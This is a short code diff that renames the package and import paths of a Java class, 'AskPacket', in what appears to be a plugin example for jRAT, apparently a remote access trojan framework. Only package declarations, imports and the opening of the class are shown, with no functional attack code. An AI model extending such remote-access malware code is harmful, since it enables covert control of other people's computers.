@@ -1,10 +1,10 @@
-package pro.jrat.client;
+package jrat.plugin.example.client;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 
-import pro.jrat.api.PacketBuilder;
-import pro.jrat.api.RATObject;
+import jrat.api.PacketBuilder;
+import jrat.api.RATObject;
 
 public class AskPacket extends PacketBuilder {
 
